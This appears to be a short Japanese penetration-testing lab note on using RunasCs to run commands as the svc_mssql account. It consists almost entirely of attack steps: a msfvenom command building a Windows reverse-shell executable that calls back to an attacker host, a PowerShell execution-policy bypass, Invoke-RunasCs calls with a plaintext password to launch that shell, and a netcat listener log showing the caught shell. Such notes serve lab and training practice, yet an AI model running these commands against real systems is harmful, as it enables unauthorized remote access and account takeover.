https://github.com/antonioCoco/RunasCs/tree/master
- 低権限ユーザがsvc_mssqlアカウントの権限でコマンド等を実行
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=135 -f exe > shell.exe
```

```powershell
powershell -ep bypass

Import-Module .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"

Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"
```

```zsh
sudo rlwrap nc -nlvp 135
[sudo] password for kali: 
listening on [any] 135 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.146.187] 51356
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```